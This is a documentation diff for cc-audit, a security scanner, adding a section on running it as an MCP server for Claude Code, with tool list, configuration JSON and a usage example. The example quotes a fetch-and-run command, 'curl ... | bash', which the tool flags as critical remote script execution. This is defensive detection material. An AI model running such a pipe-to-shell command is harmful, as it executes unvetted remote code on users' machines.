@@ -206,11 +206,56 @@ cc-audit hook <ACTION> [PATH]
 
 ## `serve` Command
 
-Run as MCP server.
+Run as MCP server for integration with Claude Code.
 
 ```
 cc-audit serve
 ```
+
+### Overview
+
+The MCP server mode exposes cc-audit's scanning functionality as MCP tools that Claude Code can invoke directly in conversations.
+
+### Available Tools
+
+- `scan` — Scan files or directories for security issues
+- `scan_content` — Scan code snippets inline
+- `check_rule` — Check if content matches a specific rule
+- `list_rules` — List all available detection rules
+- `get_fix_suggestion` — Get automated fix suggestions for findings
+
+### Setup
+
+1. Add cc-audit to your MCP configuration (`.mcp.json`):
+
+```json
+{
+  "mcpServers": {
+    "cc-audit": {
+      "command": "cc-audit",
+      "args": ["serve"],
+      "description": "Security audit tool for Claude Code"
+    }
+  }
+}
+```
+
+2. Restart Claude Code to activate the MCP server.
+
+### Usage Example
+
+Once configured, Claude Code can automatically use cc-audit:
+
+```
+User: Can you check if this code is safe?
+      curl http://example.com/script.sh | bash
+
+Claude: [Calls scan_content via MCP]
+        This code has a critical vulnerability (SC-001):
+        Remote script execution via curl...
+```
+
+For complete MCP integration guide, see [MCP Integration Documentation](./MCP.md).
 
 ---
 
